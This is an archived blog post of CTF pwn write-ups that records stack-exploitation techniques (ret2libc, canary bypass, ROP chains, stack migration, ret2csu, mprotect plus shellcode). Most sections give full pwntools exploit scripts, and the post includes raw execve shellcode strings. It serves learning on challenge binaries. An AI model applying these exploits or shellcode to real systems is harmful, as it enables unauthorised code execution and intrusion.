<!DOCTYPE html>
<html lang="en">

  
    <link rel="alternate" hreflang="zh" href="/zh/2022/02/07/bin_ctf/">
  

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
  <!-- RSS / Atom -->
  <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>

  
<link rel="stylesheet" href="/css/style.css">

  <title>çŽ°å……|junyu33</title>
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div class="head-nav">
	<div class="inner">
		<a href="/">
			çŽ°å……|junyu33
		</a>
		<div class="right">
			
				<a href="/">Home</a>
				<a href="/archives">Archive</a>
				
					<a href="/categories">Categories</a>
				
				
					<a href="/tags">Tags</a>
				
				<a href="/zh">ä¸­æ–‡ç«™</a>
			
		</div>
	</div>
</div>

  <div class="main">
    <div class="post">
    
      <nav class="lang-switch" role="navigation" aria-label="Language switch">
        
          <a class="lang-pill"
             href="/zh/2022/02/07/bin_ctf/"
             hreflang="zh">
            <span class="lang-label">ä¸­æ–‡</span>
          </a>
        
      </nav>
    

	<h1>(archived) ctf exercises (pwn)</h1>
	<p>Divided into four parts: stack, fmtstr, heap, and misc, used to record ideas and useful gadgets.</p>
<p>The following second-level headings without a website specified default to the corresponding topic section on buuoj.</p>
<blockquote>
<p>updated on 2022/10/23:</p>
<p>The first five pages of buu have been completed, and this column will no longer update specific ideas and exploits.</p>
<p>Next, I may study kernel and high-version house series. Writeups for competition problems will be published in separate articles, with links added in the corresponding sections.</p>
</blockquote>
<span id="more"></span>
<h1>stack</h1>
<h2 id="ctfshow-pwn-3-pwn03â€”â€”ret2libc">ctfshow-pwn-3: pwn03â€”â€”ret2libc</h2>
<p>You can use <a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a> to query the addresses of various functions in the libc library, then calculate the actual addresses of other functions based on offsets.</p>
<p>You can also use <a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a> to automate this process.</p>
<p>exp (without LibcSearcher):</p>
<pre><code class="language-python">from pwn import *

context.log_level = 'debug'
context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]
#io = process(&quot;./stack1&quot;)
io = remote('pwn.challenge.ctf.show', 28199)

elf = ELF(&quot;./stack1&quot;)
puts_plt = elf.plt[&quot;puts&quot;]
puts_got = elf.got[&quot;puts&quot;]
main_addr = elf.symbols[&quot;main&quot;]
payload1 = flat(b&quot;A&quot; * (9 + 4), puts_plt, main_addr, puts_got)  # Leak puts_got
io.recvuntil(&quot;\n\n&quot;)
io.sendline(payload1)
puts_addr = unpack(io.recv(4))
print(hex(puts_addr))
# 0xf7d6d360 Check on https://libc.blukat.me/

puts_libc = 0x067360
system_libc = 0x03cd10
str_bin_sh_libc = 0x17b8cf

base = puts_addr - puts_libc
system = base + system_libc
bin_sh = base + str_bin_sh_libc

payload2 = flat('a' * 13, system, 1, bin_sh )
io.sendline(payload2)
io.interactive()
</code></pre>
<p>exp (with LibcSearcher, tested)</p>
<pre><code class="language-python">from pwn import*
from LibcSearcher import*
elf=ELF('./pwn03')
#io=process('./pwn03')
io=remote('111.231.70.44',28021)
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main=elf.symbols['main']
payload1=b'a'*13+p32(puts_plt)+p32(main)+p32(puts_got)
io.sendline(payload1)
io.recvuntil('\n\n')
puts_add=u32(io.recv(4))
print(puts_add)

libc=LibcSearcher('puts',puts_add)
libcbase=puts_add-libc.dump('puts')
sys_add=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')
payload2=b'a'*13+p32(sys_add)+b'a'*4+p32(bin_sh)
io.sendline(payload2)
io.interactive()
</code></pre>
<h2 id="pwn1-sctf-2016">pwn1_sctf_2016</h2>
<p>C++ randomly shows up in this series, and I didn't understand that <code>replace()</code> function at all.</p>
<p>Moreover, if the input length exceeds 31 characters, it gets truncated, making it impossible to cause a stack overflow.</p>
<p>After reading the solution, I learned that <code>replace()</code> replaces every <code>I</code> in the input with <code>you</code>.</p>
<p>Combined with the fact that the <code>vuln()</code> function uses the dangerous <code>strcpy()</code> function at the end, I immediately knew what to do.</p>
<p>Since the offset between the input point and the return address is 60, I just needed to input 20 <code>I</code>s, followed by the address of the backdoor.</p>
<p>It seems that in the future, when encountering strange strings, I should try inputting themâ€”there might be new discoveries.</p>
<h2 id="ctfshow-pwn-4-pwn04â€”â€”Buffer-Overflow-with-Canary">ctfshow-pwn-4: pwn04â€”â€”Buffer Overflow with Canary</h2>
<p>This is a stack overflow challenge with canary protection, allowing two input operations and outputting the buffer string.</p>
<p>Through IDA debugging, it can be observed that the canary is located adjacent to the buffer string and downstream from it, making it impossible to directly overwrite the return address.</p>
<p>However, the highest byte of the canary is always 0, which leads us to the following approach:</p>
<blockquote>
<p>During the first input, fill the buffer completely so that the newline character overwrites the high byte of the canary. Then, during the second input, subtract the ASCII value corresponding to this newline character.</p>
</blockquote>
<pre><code class="language-python">from pwn import*
context.log_level = 'debug'
#elf=ELF('./stack1')
io=process('./ex2')
#io=remote('pwn.challenge.ctf.show', 28140)

payload1=b'I'*100
io.recvuntil('\n')
io.sendline(payload1)
fst_str = io.recvuntil('\x68') # A fixed byte after the canary
#print(hex(u32(fst_str[-5:-1])))

canary = u32(fst_str[-5:-1])
payload2=b'I'*100+p32(canary-0xa)+b'bbbbccccdddd'+p32(0x804859b) # '0xa' is the ASCII value of the newline character
io.sendline(payload2)

io.interactive()
</code></pre>
<p><s>So this is called a format string vulnerability after all</s></p>
<h2 id="ctfshow-pwn-6-pwn06â€”64bit-Buffer-Overflow">ctfshow-pwn-6: pwn06â€”64bit Buffer Overflow</h2>
<p>One difference between 64-bit stack overflow and 32-bit is the need to maintain stack balance, thus requiring two returns.</p>
<p><s>However, locally, I succeeded with just one return. Still unsure of the reason.</s></p>
<pre><code class="language-python">from pwn import*
#context.log_level = 'debug'

#elf=ELF('./stack1')
#io=process('./pwn')
io=remote('pwn.challenge.ctf.show', 28122)

payload1=b'I'*12+b'AAAAAAAA'+p64(0x4005b6)+p64(0x400577)
io.sendline(payload1)

io.interactive()
</code></pre>
<h2 id="ctfshow-pwn-7-pwn07â€”64bit-ret2libc">ctfshow-pwn-7: pwn07â€”64bit ret2libc</h2>
<p>A 64-bit pwn3.</p>
<p>Since the <a target="_blank" rel="noopener" href="https://junyu33.github.io/2022/01/15/csapp.html#%E8%BF%87%E7%A8%8B">parameter passing method in 64-bit</a> is &quot;first 6 in registers, then using the stack,&quot; the values of the registers need to be popped during stack unwinding. Therefore, it is necessary to find the values of <code>pop_rdi</code> and <code>pop_ret</code> and insert them into the payload.</p>
<p>Commands to find the addresses of <code>pop_rdi</code> and <code>pop_ret</code> instructions:</p>
<pre><code class="language-shell">ROPgadget --binary pwn --only 'pop|ret' 
</code></pre>
<p>Then the payload format is as follows:</p>
<pre><code class="language-python"># for 32 bit
b'a'*offset + p32(puts_plt) + p32(ret_addr) + p32(puts_got)
b'a'*offset + p32(sys_addr) + b'A'*4 + p32(str_bin_sh)
# for 64 bit
b'a'*offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)
b'a'*offset + &quot;&quot;&quot;p64(pop_ret)&quot;&quot;&quot; + p64(pop_rdi) + p64(str_bin_sh) + p64(sys_addr)
</code></pre>
<p>exp (with LibcSearcher, tested)</p>
<pre><code class="language-python"># ctf.show - libc6_2.27
from pwn import*
from LibcSearcher import*
context.log_level = 'debug'
elf=ELF('./pwn')
#io=process('./pwn')
io=remote('pwn.challenge.ctf.show',28184)
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main=elf.symbols['main']

pop_rdi = 0x4006e3
pop_ret = 0x4004c6

payload1=b'a'*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
io.sendline(payload1)
io.recvline()
str_first = io.recv(6).ljust(8,b'\x00')
puts_add=u64(str_first)
print(hex(puts_add))

libc=LibcSearcher('puts',puts_add)

libcbase=puts_add-libc.dump('puts')
sys_add=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')

payload2=b'a'*20+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_add)
io.sendline(payload2)
io.interactive()
</code></pre>
<p><s>However, it's strange that this code doesn't work locally again</s></p>
<h2 id="ciscn-2019-c-1">ciscn_2019_c_1</h2>
<p>A pwn07 with encryption. (Testing revealed that it's actually possible to get a shell without processing the input.)</p>
<p>Exploit code to obtain the GOT table address:</p>
<pre><code class="language-python">io.recvuntil('!\n')
io.sendline(b'1')
io.recvuntil('\n')
payload1=b'l'*88+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
io.sendline(payload1)
io.recvline()
io.recvline()

str_first = io.recv(6).ljust(8,b'\x00')
</code></pre>
<p>Specifically, this location:</p>
<img src="https://img.junyu33.me/blog/bin_ctf/ciscn1.png">
<blockquote>
<p>Why is the address of pop_rdi still at that location, and why has the length become shorter?</p>
</blockquote>
<h2 id="xctf-pwn-beginner-7-cgpwn2â€”â€”ret2libc-with-system">xctf-pwn-(beginner)-7: cgpwn2â€”â€”ret2libc with system</h2>
<p>A ret2libc attack with system but without <code>/bin/sh</code>. The key part is as follows:</p>
<pre><code class="language-python">payload = b'a'*42 + p32(gets_plt) + p32(pop_ebx) + p32(buf2) + p32(system_plt) + p32(0xdeadbeef) + p32(buf2)
io.sendline(payload)
io.sendline('cat flag')
</code></pre>
<p><strong>Will explain the principle when I have time.</strong></p>
<h2 id="xctf-pwn-beginner-8-level3â€”ret2libc-without-puts">xctf-pwn-(beginner)-8: level3â€”ret2libc without puts</h2>
<p>It's still ret2libc, but there is no <code>puts</code> function, so the payload to leak the libc address needs to be adjusted:</p>
<img src="https://img.junyu33.me/blog/bin_ctf/write.png">
<pre><code class="language-python">payload = flat([b'A' * 140, write_plt, main, 1, write_got, 4]) # the last three are arguments of &quot;write&quot;
</code></pre>
<p>Unfortunately, this time the Libcsearcher matches were not useful, but the challenge provided a <code>libc_32.so.6</code> file. We need to use this file to import the libc library locally.</p>
<pre><code class="language-python">libc=ELF('./libc_32.so.6') #import

libcbase = libc_start_main_addr - libc.symbols['write'] 
system_addr = libcbase + libc.symbols['system'] #leak
binsh_addr = libcbase + 'bin_sh_addr' # we can't use 'symbols' to get address, we do it manually.
</code></pre>
<p>So what about <code>'bin/sh'</code>? Use this bash command:</p>
<pre><code class="language-sh">strings -a -t x libc_32.so.6 | grep &quot;bin/sh&quot; 
</code></pre>
<h3 id="How-to-Connect-with-libc-Locally-â€“-3-18-2022">How to Connect with libc Locally â€“ 3/18/2022</h3>
<pre><code class="language-sh">ls -l /lib/x86_64-linux-gnu/libc.so.6 # Find your local libc. For example, it's &quot;libc-2.27.so&quot; in WSL Ubuntu 18.04.
# Make sure to adjust your &quot;import&quot; statements and your &quot;strings &amp; grep&quot; commands accordingly.
</code></pre>
<blockquote>
<p>Achievement Unlocked: Finished the xctf-pwn beginner section! ðŸŽ‰</p>
</blockquote>
<h2 id="get-started-3dsctf-2016â€”â€”rop1">get_started_3dsctf_2016â€”â€”rop1</h2>
<p>32bit.</p>
<p>The program provides a backdoor to read the flag, but requires passing two correct parameters.</p>
<p>Learned GDB debugging and recalled that the return address is separated from the function parameters by one return address. Function parameters are written in positive order.</p>
<p>The program flushes the buffer address upon exit, allowing the use of <code>recv()</code> to obtain file output.</p>
<pre><code class="language-python">from pwn import*
from LibcSearcher import*

#io = process(argv = ['./get_started_3dsctf_2016'])
io = remote('node4.buuoj.cn', 27428)

backdoor = 0x80489a0
exit_addr = 0x804e6a0
arg1 = 0x308CD64F
arg2 = 0x195719D1
#gdb.attach(io, 'b *0x8048a3d')
context.log_level = 'debug'

payload1 = b'a'*56 + p32(backdoor) + p32(exit_addr) +p32(arg1) + p32(arg2)

io.sendline(payload1)

print(io.recv())

#io.interactive()

</code></pre>
<h2 id="not-the-same-3dsctf-2016â€”â€”rop2">not_the_same_3dsctf_2016â€”â€”rop2</h2>
<blockquote>
<p>There is a function that has already read the flag value and stored it at the location <code>fl4g</code>. Therefore, we first use this function to overwrite the return address, reading the flag into memory starting at the address <code>fl4g</code>. Next, we attempt to leak the content from this location to obtain the flag. For this, we need the <code>write</code> function. Since <code>write</code> requires three parameters, <s>we also need an instruction to pop three registers to clean up the stack. The final <code>p32(0)</code> corresponds to the <code>ret</code> operation included in the pop instruction, so an additional return address is needed. Since we have already output the flag, the return address does not matter and can be arbitrary.</s> The specific exploit is as follows:</p>
<p>Copyright Notice: This article is an original work by the blogger &quot;ShouCheng3&quot; on CSDN, following the CC 4.0 BY-SA copyright license. Please include the original source link and this notice when reprinting.
Original link: <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51232724/article/details/124057645">https://blog.csdn.net/qq_51232724/article/details/124057645</a></p>
</blockquote>
<p><s>I don't quite understand this ROP operation. Actually, replacing that <code>pop3</code> with another address doesn't seem to make a difference.</s></p>
<p>Now I understandâ€”since this is 32-bit, the following three items serve as parameters and do not require register popping.</p>
<pre><code class="language-python">from pwn import *
from LibcSearcher import *
#io = process('123')
io = remote('node4.buuoj.cn', 27043)
elf = ELF('123')
context.log_level = 'debug'

flag_addr = 0x80eca2d
get_flag = 0x80489a0
pop3 = 0x80483b8
write_addr = elf.symbols['write']
#print(hex(write_addr))

payload = b'a'*(45) + p32(get_flag)+p32(write_addr)+p32(pop3)+p32(1)+p32(flag_addr)+p32(42)
#gdb.attach(io, 'break *0x8048a00')
io.sendline(payload)
#io.recv()
print(io.recv())
io.interactive()
</code></pre>
<h2 id="HarekazeCTF2019-baby-rop2â€”â€”rop3">[HarekazeCTF2019]baby_rop2â€”â€”rop3</h2>
<pre><code class="language-python">#rop
#printf(&quot;your input is %s!&quot;, buf);
payload1 = b'a'*(0x20+8) + p64(pop_rdi) + p64(fmt_addr) #1st argument of printf -&gt; rdi
payload1 += p64(pop_rsi_r15) + p64(read_got) + p64(0) #2nd argument of printf -&gt; rsi
payload1 += p64(printf_plt) + p64(main_addr) #call printf_plt to output the got of read()

payload2 = b'a'*(0x20+8) + p64(pop_rdi) + p64(bin_sh)+ p64(sys_addr)
</code></pre>
<p>The reason for using <code>read_got</code> instead of <code>printf_got</code> in the second line is that <code>printf</code> does not support null-terminated truncation at the end.</p>
<h2 id="ciscn-2019-es-2â€”Stack-Migration-1">ciscn_2019_es_2â€”Stack Migration 1</h2>
<p>Applicable when the payload length is limited, this technique writes the ROP chain onto the stack and hijacks the program execution flow to the constructed ROP chain by modifying the value of <code>ebp</code>.</p>
<p>In this challenge, the read length is limited to <code>sizeof(buf) + 8</code>, so the previous <code>retlibc3</code> method cannot be used directly.</p>
<p>The buffer variable and the upper function's <code>ebp</code> are obtained through dynamic debugging:</p>
<img src='https://img.junyu33.me/blog/bin_ctf/stack_trans.png'>
<p>As shown in the figure, <code>0xffffcdd8 - 0xffffcda0 = 0x38</code> is the offset between the tampered stack frame <code>ebp</code> and the input.</p>
<pre><code class="language-python">from pwn import *

def hijackebp():
   payload1 = b'a'*0x27 + b'b'
   io.sendafter('Welcome, my friend. What\'s your name?\n', payload1) # !!! send, not sendline !!!
   io.recvuntil('b')
   ebp = u32(io.recv(4)) # the value of ebp ([ebp])
   s = ebp - 0x38 # the offset between [ebp] and your input argument (get this by debugging)
   return s

def exploit(s):
   payload2 = (p32(fake_ebp) + p32(sys_plt) + p32(vul) + p32(s + 0x10) + b'/bin/sh').ljust(0x28, b'\0')
   # fake ret_addr, true ret_addr 
   payload2 += p32(s) + p32(leave)
   # input_addr, leave_ret_rop
   io.sendline(payload2)

if __name__ == &quot;__main__&quot;:
   #io = process('./ciscn_2019_es_2')
   io = remote('node4.buuoj.cn', 25446)
   context.log_level = 'debug'
   elf = ELF('./ciscn_2019_es_2')

   sys_plt = elf.sym['system']
   leave = 0x080484b8
   vul = 0x8048595

   input_addr = hijackebp()
   exploit(input_addr)
   
   io.interactive()
</code></pre>
<h2 id="ciscn-2019-s-3â€”ret2csu">ciscn_2019_s_3â€”ret2csu</h2>
<p>The key point of this challenge is to execute the function <code>execve('/bin/sh',0,0)</code>. To call this function, the <code>syscall</code> instruction is required, and the following conditions must be met: <code>rax = 0x3b, rdi = &lt;bin_sh_addr&gt;, rsi = rdx = 0</code>.</p>
<p>You can obtain <code>pop rdi</code> and <code>pop rsi</code> gadgets from <code>ROPgadget</code> to successfully pass parameters, and <code>mov rax, 3bh</code> can also be found near the <code>gadgets</code> function. However, there are no direct stack-related instructions involving the <code>rdx</code> register, and the program does not contain the <code>/bin/sh</code> string, so you need to insert it yourself and locate its address on the stack.</p>
<p>By searching for the string <code>rdx</code> in IDA, the only instruction that might change the value of <code>rdx</code> is found in <code>__libc_csu_init</code>. Below is its disassembled code (the latter part):</p>
<h3 id="libc-csu-init-Source">__libc_csu_init Source</h3>
<pre><code class="language-assembly">.text:0000000000400580                                   loc_400580:                   ; CODE XREF: __libc_csu_init+54â†“j
.text:0000000000400580 038 4C 89 EA                      mov     rdx, r13
.text:0000000000400583 038 4C 89 F6                      mov     rsi, r14
.text:0000000000400586 038 44 89 FF                      mov     edi, r15d
.text:0000000000400589 038 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]
.text:0000000000400589
.text:000000000040058D 038 48 83 C3 01                   add     rbx, 1
.text:0000000000400591 038 48 39 EB                      cmp     rbx, rbp
.text:0000000000400594 038 75 EA                         jnz     short loc_400580
.text:0000000000400594
.text:0000000000400596
.text:0000000000400596                                   loc_400596:                   ; CODE XREF: __libc_csu_init+34â†‘j
.text:0000000000400596 038 48 83 C4 08                   add     rsp, 8
.text:000000000040059A 030 5B                            pop     rbx
.text:000000000040059B 028 5D                            pop     rbp
.text:000000000040059C 020 41 5C                         pop     r12
.text:000000000040059E 018 41 5D                         pop     r13
.text:00000000004005A0 010 41 5E                         pop     r14
.text:00000000004005A2 008 41 5F                         pop     r15
.text:00000000004005A4 000 C3                            retn
.text:00000000004005A4                                   ; &#125; // starts at 400540
.text:00000000004005A4
.text:00000000004005A4                                   __libc_csu_init endp
</code></pre>
<p>Our target is the instruction <code>mov rdx, r13</code>. Since <code>r13</code> is in the pop sequence, we can insert the <code>pop_6</code> gadget followed by 6 addresses. Among these, <code>r13</code> and <code>r14</code> must be set to 0 to match the subsequent jump to <code>chg_rdx</code>.</p>
<p>Next is the issue of <code>call [r12+rbx*8]</code>. Theoretically, this instruction can jump to any address. Here, I chose to jump directly to the next instruction (though it could fully jump to the next gadget), so we can set <code>[r12] = 0x40058d</code> and <code>rbx = 0</code>.</p>
<p>How do we obtain the value of <code>r12</code>? It certainly has a fixed offset from the input address. We can write a gadget pointing to its own payload to additionally print current stack information. I placed the <code>/bin/sh</code> string at the input location. The offset between the input location and the value at <code>input_addr+0x20</code> can be obtained through dynamic debugging (this offset may differ between remote and local environments, but the difference is small and can be adjusted by trial and error).</p>
<p>To avoid the loop at <code>0x400594</code>, we should set <code>rbx + 1 == rbp</code>. Here, I set <code>rbp = 1</code>, and then pass 6 arbitrary addresses for popping.</p>
<p>Since <code>mov edi, r15d</code> will zero the upper bits of <code>rdi</code>, we need to set another <code>pop_rdi</code> payload. Finally, call <code>syscall</code>.</p>
<blockquote>
<p>ðŸŽ‰ Finished the first page of BUU!</p>
</blockquote>
<pre><code class="language-python">eax_59 = 0x4004e2 # rax = 0x3b
get_sys = 0x400517
pop_rdi = 0x4005a3
vuln = 0x4004ed
pop_6 = 0x40059a
chg_rdx = 0x400580
'''
rax = 59
execve('/bin/sh',0,0); rdi,rsi,rdx

offset = 0x128
'''
def exploit():
   payload0 = b'a'*16 + p64(vuln)
   io.send(payload0)
   input_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x118 # in local it's 0x128
   log.success('input_addr==&gt;'+hex(input_addr))

   payload1 = b'/bin/sh\0' + p64(0x40058d) + p64(eax_59)
   #payload1 += p64(pop_r15) + p64(pop_r15) + p64(get_sys)
   #mov rdi=inputaddr, rsi=0, rdx=0
   payload1 += p64(pop_6) + p64(0) + p64(1) + p64(input_addr+8) + p64(0) + p64(0) + p64(0) 
   payload1 += p64(chg_rdx) + p64(0)*6
   payload1 += p64(pop_rdi) + p64(input_addr)
   payload1 += p64(get_sys)

   io.send(payload1)
</code></pre>
<h2 id="Black-Watch-Recruitment-Challenge-PWN-1â€”Stack-Migration-2">[Black Watch Recruitment Challenge] PWN 1â€”Stack Migration 2</h2>
<p><s>It's so hard to join a group these days</s></p>
<p>Stack migration requires writing your ROP chain to a fixed segment (such as the .bss section), and then modifying the value of EBP to achieve stack redirection. This technique is suitable for situations where the buffer overflow length is limited.</p>
<pre><code class="language-python">payload1 = p32(fake_ebp) + p32(write_plt) + p32(vuln) + p32(1) + p32(write_got) + p32(4)
# ROP chain for write_got leak written to the .bss segment
payload2 = b'a'*(24) + p32(bss) + p32(leave_ret)
# Stack overflow in the vuln function, note that the leave instruction increases EBP by 4 bytes
</code></pre>
<h2 id="cmcc-simpleropâ€”statically-linked-rop">cmcc_simpleropâ€”statically_linked rop</h2>
<p>Method to check for static linking: use the <code>file</code> command.</p>
<h3 id="Method-1-â€”-Manual-ROP">Method 1 â€” Manual ROP</h3>
<p>This ROP chain hands over the read function to the user for input, which is a clever and previously unseen type.</p>
<pre><code class="language-python">def exploit():
   read = 0x806cd50
   pop_edx_ecx_ebx = 0x806e850
   pop_eax = 0x80bae06
   int_80 = 0x080493e1
   buf = 0x80ec304 # any address inside the program is OK.

   payload = flat([b'a'*32, read, pop_edx_ecx_ebx, 0, buf, 8]) #8 is len('/bin/sh\0')
   payload += flat([pop_eax, 0xb, pop_edx_ecx_ebx, 0, 0, buf])
   payload += flat(int_80)
   io.sendline(payload)
   io.sendline(b'/bin/sh\0')
</code></pre>
<h3 id="Method-2â€”â€”Ropper-execve">Method 2â€”â€”Ropper execve</h3>
<pre><code class="language-sh">ropper -f &lt;file&gt; --chain execve
</code></pre>
<p><strong>Note: The generated syntax is Python 2 syntax, and you need to manually change <code>str</code> to <code>bytes</code>.</strong></p>
<p>Although the ROP chain generated by <code>ropper</code> is shorter than that from <code>ROPgadget</code>, it still does not meet the <code>read</code> length limitation.</p>
<pre><code class="language-python">def exploit():
   p = lambda x : pack('I', x)

   IMAGE_BASE_0 = 0x08048000
   rebase_0 = lambda x : p(x + IMAGE_BASE_0)

   rop = b'a'*32

   rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
   rop += b'//bi'
   rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
   rop += rebase_0(0x000a2060)
   rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
   rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
   rop += b'n/sh'
   rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
   rop += rebase_0(0x000a2064)
   rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
   rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
   rop += p(0x00000000)
   rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
   rop += rebase_0(0x000a2068)
   rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
   rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
   rop += rebase_0(0x000a2060)
   rop += rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret; 
   rop += rebase_0(0x000a2068)
   rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
   rop += rebase_0(0x000a2068)
   rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
   rop += p(0x0000000b)
   rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret; 
   io.sendline(rop)
</code></pre>
<p>At this point, manual modification is needed, and the previously learned assembly knowledge comes in handy:</p>
<pre><code class="language-python">def exploit():
   p = lambda x : pack('I', x)

   IMAGE_BASE_0 = 0x08048000
   rebase_0 = lambda x : p(x + IMAGE_BASE_0)

   rop = b'a'*32

   rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
   rop += b'/bin'
   rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
   rop += rebase_0(0x000a2060)
   rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 

   rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
   rop += b'/sh\0'
   rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
   rop += rebase_0(0x000a2064)
   rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 

   rop += p(0x806e850) # 0x806e850: pop edx; pop ecx; pop ebx; ret;
   rop += p(0)
   rop += p(0)
   rop += rebase_0(0x000a2060)
   
   rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
   rop += p(0x0000000b)
   rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret; 
    
   print(len(rop))
   io.sendline(rop)
</code></pre>
<p>The length is exactly 100, which passes.</p>
<h3 id="Method-3â€”â€”mprotect-shellcode">Method 3â€”â€”mprotect + shellcode</h3>
<p><code>int mprotect(const void *start, size_t len, int prot);</code></p>
<blockquote>
<p>The first parameter is the starting address of the allocated memory, which must be aligned with the memory page, i.e., divisible by 0x1000; the second parameter must also be a multiple of the memory page size; the third parameter defines the memory attributes, where 1 stands for readable, 2 for writable, 4 for executable, and 7 for readable, writable, and executable.</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/115286266">https://blog.csdn.net/A951860555/article/details/115286266</a></p>
</blockquote>
<pre><code class="language-python">def exploit():
   read = 0x806cd50
   mprotect = 0x806d870
   buf = 0x8050000 # must be multiple of 0x1000
   pop_edx_ecx_ebx = 0x806e850
   shellcode = asm(shellcraft.sh())

   payload = flat([b'a'*32, mprotect, pop_edx_ecx_ebx, buf, 0x1000, 7])
   payload += flat([read, pop_edx_ecx_ebx, 0, buf, len(shellcode)])
   payload += flat(buf)

   io.sendline(payload)
   io.sendline(shellcode)
</code></pre>
<h2 id="wustctf2020-getshell-2â€”â€”System-Call">wustctf2020_getshell_2â€”â€”System Call</h2>
<p>Originally thought stack migration would be needed, but a <code>system call</code> solved it, saving 4 bytes of space.</p>
<pre><code class="language-python">system_call = 0x8048529
sh = 0x8048670
payload = 'a'*28 + p32(system_call)+p32(sh)
</code></pre>
<h2 id="pwnable-start">pwnable_start</h2>
<p>23-byte shellcode: <code>b'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80'</code></p>
<p>Or a 20-byte version: <code>b'\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'</code></p>
<p>ret2shellcode, call the write function to leak the stack address.</p>
<blockquote>
<p>Celebration for finishing the second page of buu~</p>
</blockquote>
<pre><code class="language-python">def exploit():
   shellcode = b'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80'
   payload = b'a'*20 + p32(0x8048087)
   io.send(payload)
   io.recvuntil('CTF:')
   buf = u32(io.recv(4))
   payload = b'a'*20 + p32(buf+0x14) + shellcode
   io.sendline(payload)
</code></pre>
<h2 id="nepctf2022-nyancatâ€”â€”syscall">nepctf2022: nyancatâ€”â€”syscall</h2>
<p>Due to the NX protection being enabled, it is not possible to directly write shellcode.</p>
<pre><code class="language-python">def exploit():
   payload1 = b'a'*16 + p32(0x80480f0) + p32(0x8048115) 
   payload1 += p32(0) + p32(0x804b090) + p32(0x804b097) + p32(0)
   # 0 is fd, 0x804b090 is buf and the memory of 0x804b097 is 0 (so ebx = edx = 0, ecx = flag_addr)
   # after return, ecx = edx = 0 &amp;&amp; ebx = ecx = flag_addr    
   io.send(payload1)

   payload2 = b'/bin/sh'.ljust(0xb, b'\0') # the length of the input (eax) is 0xb, time to getshell
   io.send(payload2)
</code></pre>
<h2 id="gyctf-2020-borrowstack-Stack-Migration-3">gyctf_2020_borrowstack - Stack Migration 3</h2>
<p>For multiple stack migrations, it is necessary to pre-write the next segment in the BSS section to serve as ebp/rbp.</p>
<pre><code class="language-python">def exploit():
   puts_got = elf.got['puts']
   puts_plt = elf.plt['puts']

   payload1 = b'a'*offset + p64(bss+0x90) + p64(leave_ret)
   p.send(payload1)
   payload2 = b'\0'*0x90 + p64(bss+0x60) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(read_leave)
   p.send(payload2)

   puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\0'))
   libc_base = puts_addr - libc.sym['puts']
   one_gadget = libc_base + one_gadget_local

   payload3 = b'\0'*0x60 + p64(0) + p64(one_gadget)
   p.send(payload3)
</code></pre>
<h2 id="qwb2022-devnullâ€”Stack-Migration-ROP">qwb2022_devnullâ€”Stack Migration + ROP</h2>
<p>64-bit shellcode: <code>b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'</code></p>
<p>The first stack overflow (off by one) enables input by changing the file descriptor to 0.</p>
<p>The second stack overflow modifies the buf pointer and rbp, and performs a stack migration.</p>
